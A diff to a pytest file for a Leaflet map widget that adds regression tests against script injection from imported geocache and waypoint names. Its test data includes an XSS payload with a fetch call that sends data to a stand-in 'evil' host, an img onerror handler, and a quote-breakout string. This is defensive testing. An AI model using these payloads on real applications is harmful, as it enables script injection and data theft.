@@ -1,5 +1,6 @@
 # tests/unit-tests/test_map_widget.py — Leaflet map widget (headless mode).
 
+import json
 from types import SimpleNamespace
 
 import pytest
@@ -557,7 +558,7 @@ class TestShowNearbyForSelection:
         js = next(j for j in w._page.js if "loadNearbyCaches" in j)
         assert "GCSEL" in js and "GCNBR" in js
         assert "51.5074" in js and "-0.1278" in js
-        assert "'GCSEL'" in js   # centre gc_code arg, quote-escaped like pan_to_cache
+        assert '"GCSEL"' in js   # centre gc_code arg, a JSON string literal like pan_to_cache
         assert "2.0" in js
 
     def test_label_text_forwarded_verbatim(self, w):
@@ -575,11 +576,13 @@ class TestShowNearbyForSelection:
         js = next(j for j in w._page.js if "loadNearbyCaches" in j)
         assert ', ""' in js or ",\"\"" in js.replace(" ", "")
 
-    def test_gc_code_with_quote_is_escaped(self, w):
-        selected = _cache(gc_code="GC'SEL")
+    def test_gc_code_is_passed_as_json_literal(self, w):
+        # A backslash used to defeat the old "'" -> "\\'" escaping.
+        evil = "GC\\');alert(1)//"
+        selected = _cache(gc_code=evil)
         w.show_nearby_for_selection(selected, [selected], 2.0, "")
         js = next(j for j in w._page.js if "loadNearbyCaches" in j)
-        assert "GC\\'SEL" in js
+        assert f", {json.dumps(evil)}, " in js
 
     def test_noop_when_not_ready(self, qtbot, fake_settings):
         widget = MapWidget()
@@ -620,11 +623,11 @@ class TestNearbyOverlayJs:
         # see show_nearby_for_selection()'s docstring.
         body = self._fn_body("loadCaches", "afterCachesLoaded")
         assert "clearNearbyOverlay();" in body
-        assert body.index("clearNearbyOverlay();") < body.index("JSON.parse(cachesJson)")
+        assert body.index("clearNearbyOverlay();") < body.index("caches.forEach")
 
     def test_loadNearbyCaches_composes_expected_calls(self):
         body = self._fn_body("loadNearbyCaches", "drawNearbyCircle")
-        assert "loadCaches(cachesJson);" in body
+        assert "loadCaches(caches);" in body
         assert "drawNearbyCircle(centerLat, centerLon, radiusKm);" in body
         assert "updateNearbyLabel(labelText);" in body
         assert "panToCache(gcCode);" in body
@@ -642,3 +645,90 @@ class TestNearbyOverlayJs:
         body = self._fn_body("clearNearbyOverlay", "fitAllMarkers")
         assert "clearNearbyCircle();" in body
         assert "clearNearbyLabel();" in body
+
+
+# ── Script injection from imported cache data ─────────────────────────────────
+#
+# Cache/waypoint names are written by cache owners and arrive via GPX/GSAK
+# imports. They used to be spliced into a JS template literal (only "\" and
+# "`" escaped, so "${...}" still ran) and into Leaflet popups as raw HTML.
+
+EVIL = "${fetch('https://evil/?d='+1)}`<img src=x onerror=alert(1)>\\"
+
+
+def _js_call_arg(js: str, fn: str):
+    """Parse the single JSON argument of a recorded `fn(<json>)` call."""
+    assert js.startswith(fn + "(") and js.endswith(")")
+    return json.loads(js[len(fn) + 1:-1])
+
+
+class TestScriptInjection:
+    @pytest.fixture
+    def w(self, qtbot, fake_settings):
+        widget = MapWidget()
+        qtbot.addWidget(widget)
+        widget._ready = True
+        widget._page = FakePage()
+        return widget
+
+    @staticmethod
+    def _fn_body(fn_name: str, end_marker: str) -> str:
+        start = mw_mod.MAP_HTML.index(f"function {fn_name}")
+        return mw_mod.MAP_HTML[start:mw_mod.MAP_HTML.index(end_marker, start)]
+
+    def test_load_caches_passes_plain_json_argument(self, w):
+        w.load_caches([_cache(name=EVIL)])
+        js = next(j for j in w._page.js if j.startswith("loadCaches("))
+        assert _js_call_arg(js, "loadCaches")[0]["name"] == EVIL
+
+    def test_update_cache_passes_plain_json_argument(self, w):
+        w.update_cache(_cache(name=EVIL))
+        js = next(j for j in w._page.js if j.startswith("updateCacheMarker("))
+        assert _js_call_arg(js, "updateCacheMarker")["name"] == EVIL
+
+    def test_waypoints_pass_plain_json_argument(self, w):
+        wps = [{"lat": 55.1, "lon": 12.1, "prefix": EVIL, "wp_type": EVIL, "name": EVIL}]
+        w.show_waypoint_markers(json.dumps(wps))
+        js = next(j for j in w._page.js if j.startswith("showWaypointMarkers("))
+        assert _js_call_arg(js, "showWaypointMarkers") == wps
+
+    def test_pan_to_cache_passes_plain_json_argument(self, w):
+        evil = "GC\\');alert(1)//"
+        w.pan_to_cache(evil)
+        assert _js_call_arg(w._page.js[-1], "panToCache") == evil
+
+    def test_home_label_passes_plain_json_argument(self, w):
+        w.pan_to_location(1.0, 2.0, EVIL)
+        js = next(j for j in w._page.js if j.startswith("setHomeLocation("))
+        assert js.endswith(f", {json.dumps(EVIL, ensure_ascii=False)})")
+
+    def test_js_takes_data_arguments_not_strings_to_parse(self):
+        assert "JSON.parse" not in mw_mod.MAP_HTML
+
+    def test_escape_html_covers_markup_characters(self):
+        body = self._fn_body("escapeHtml", "\n}")
+        for entity in ("&amp;", "&lt;", "&gt;", "&quot;", "&#39;"):
+            assert entity in body
+
+    def test_cache_popup_escapes_imported_fields(self):
+        body = self._fn_body("cachePopupHtml", "\n}")
+        for field in ("gc_code", "name", "cache_type", "corrected_label"):
+            assert f"escapeHtml(c.{field})" in body
+
+    def test_cache_popups_use_shared_escaped_builder(self):
+        for fn, end in (("loadCaches", "\nfunction afterCachesLoaded"),
+                        ("updateCacheMarker", "</script>")):
+            assert "marker.bindPopup(cachePopupHtml(c));" in self._fn_body(fn, end)
+
+    def test_waypoint_marker_and_popup_escape_imported_fields(self):
+        body = self._fn_body("showWaypointMarkers", "\nfunction updateCacheMarker")
+        assert "escapeHtml(wp.prefix)" in body
+        assert "escapeHtml(wp.wp_type)" in body
+        assert "escapeHtml(wp.name)" in body
+        # Only the plain-text marker title (set as an attribute) may use raw values.
+        html_lines = [l for l in body.splitlines() if "html:" in l or "var popup" in l]
+        assert html_lines and not any("+ wp." in l for l in html_lines)
+
+    def test_home_popup_escapes_label(self):
+        body = self._fn_body("setHomeLocation", "\n}")
+        assert "escapeHtml(label)" in body
